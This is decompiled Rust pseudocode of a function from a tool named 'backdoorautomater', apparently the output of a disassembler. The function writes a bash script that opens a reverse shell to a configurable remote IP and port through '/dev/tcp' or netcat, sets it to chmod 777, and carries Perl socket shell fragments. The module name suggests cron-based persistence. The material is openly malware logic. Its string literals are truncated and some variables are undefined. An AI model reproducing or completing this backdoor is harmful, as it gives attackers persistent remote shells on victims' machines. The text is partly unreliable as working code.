
  fn backdoorautomater::cronshell::write_shell_bash::he63b55dff26362cc(arg1: *mut i64, arg2: *mut i64, arg3: *mut i64) -> *mut *mut [i8; 0x94]

{
    let mut var_168: i32;
    std::fs::File::create::he97042899d0016f9(&var_168, arg3);
    let mut result: *mut *mut [i8; 0x94];
    
    if var_168 == 0
    {
        let fd_1: i32;
        let mut fd: i32 = fd_1;
        std::process::Command::new::hc59b10cf3f1b2ada(&var_168, 
            "sh-cFailed to execute command*/c…");
        std::process::Command::arg::ha1bca970e684ecbe(
            std::process::Command::arg::ha1bca970e684ecbe(&var_168, 
                "-cFailed to execute command*/cro…"), 
            "ls /bin/ncls /bin/usr/nc#!/bin/b…");
        let mut var_208: i128;
        std::process::Command::output::hf2f7777b705db8a9(&var_208);
        let mut var_98: ();
        core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_98, &var_208);
        core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_168);
        std::process::Command::new::hc59b10cf3f1b2ada(&var_168, 
            "sh-cFailed to execute command*/c…");
        std::process::Command::arg::ha1bca970e684ecbe(
            std::process::Command::arg::ha1bca970e684ecbe(&var_168, 
                "-cFailed to execute command*/cro…"), 
            "ls /bin/usr/nc#!/bin/bash\n\nREM…");
        std::process::Command::output::hf2f7777b705db8a9(&var_208);
        let mut var_60: ();
        core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_60, &var_208);
        core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_168);
        let var_70: i64;
        let var_38: i64;
        
        if var_70 != 0 && var_38 != 0
        {
            let result_2: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "#!/bin/bash\n\nREMOTE_IP="REMOTE…", 0xd);
            result = result_2;
            
            if result_2 != 0
            {
                goto 'label_463784;
            }
            
            let result_3: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "/bin/bash -c 'bash -i >& /dev/tc…", 0x22);
            result = result_3;
            
            if result_3 != 0
            {
                goto 'label_463784;
            }
            
            let result_4: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, arg2[1], arg2[2]);
            result = result_4;
            
            if result_4 != 0
            {
                goto 'label_463784;
            }
            
            let result_5: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, &data_5674ac[0x22], 1);
            result = result_5;
            
            if result_5 != 0
            {
                goto 'label_463784;
            }
            
            let result_6: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, arg1[1], arg1[2]);
            result = result_6;
            
            if result_6 != 0
            {
                goto 'label_463784;
            }
            
            let result_7: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, &data_5674ac[0x23], 0x15);
            result = result_7;
            
            if result_7 != 0
            {
                goto 'label_463784;
            }
            
            goto 'label_4637de;
        }
        
        let result_8: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "#!/bin/bash\n\nREMOTE_IP="REMOTE…", 0xd);
        result = result_8;
        
        if result_8 != 0
        {
            goto 'label_463784;
        }
        
        var_168 = "REMOTE_IP="REMOTE_PORT=/bin/nc $…";
        let var_160: i64 = 0xb;
        let var_158_1: i128 = *arg2.byte_offset(8);
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_208, &var_168, 2, 1, 0);
        let mut var_228: i128 = var_208;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_228, 
            ""\n\n\nls /bin/ncls /bin/usr/nc#…", 2);
        let var_1f8: u64;
        let result_9: *mut *mut [i8; 0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_228[8], var_1f8);
        result = result_9;
        
        if result_9 != 0
        {
            goto 'label_463777;
        }
        
        var_168 = "REMOTE_PORT=/bin/nc $REMOTE_IP $…";
        let var_160_1: i64 = 0xc;
        let var_158_2: i128 = *arg1.byte_offset(8);
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_208, &var_168, 2, 1, 0);
        let mut var_1c8: i128 = var_208;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1c8, 
            "\n\nls /bin/ncls /bin/usr/nc#!/b…", 2);
        let result_10: *mut *mut [i8; 0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1c8[8], var_1f8);
        result = result_10;
        let mut result_11: *mut *mut [i8; 0x94];
        
        if result_10 == 0
        {
            result_11 = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "/bin/nc $REMOTE_IP $REMOTE_PORT …", 0x3b);
            result = result_11;
        }
        
        if result_10 == 0 && result_11 == 0
        {
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_228);
            'label_4637de:
            let zmm0_1: i64 = *arg3.byte_offset(8);
            var_168 = "chmod 777 ;\nuse Socket;\n$p=soc…";
            let var_160_2: i64 = 0xa;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_208, &var_168, 2, 1, 0);
            let zmm0_6: i128 = var_208;
            std::process::Command::new::hc59b10cf3f1b2ada(&var_168, 
                "sh-cFailed to execute command*/c…");
            let mut rbp: i64;
            rbp = 1;
            let rax_8: *mut i64 = std::process::Command::arg::ha1bca970e684ecbe(&var_168, 
                "-cFailed to execute command*/cro…");
            let var_1f8_1: u64 = var_1f8;
            var_208 = zmm0_6;
            std::process::Command::arg::hc1c88ee68029addc(rax_8, &var_208);
            std::process::Command::output::hf2f7777b705db8a9(&var_208);
            core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_1c8, &var_208);
            core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_168);
            let var_1a8: i64;
            let var_1a0: size_t;
            alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_208, var_1a8, var_1a0);
            let mut rax_9: i64;
            let mut rdx_16: u64;
            rax_9 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_208);
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                &var_168, rax_9, rdx_16);
            let var_218_2: i64 = zmm0_1;
            var_228 = var_168;
            core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                &var_208);
            backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_228);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_228);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_1c8);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_60);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_98);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            result = nullptr;
        }
        else
        {
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            'label_463777:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_228);
            'label_463784:
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_60);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_98);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
    }
    else
    {
        let result_1: *mut *mut [i8; 0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    result
}
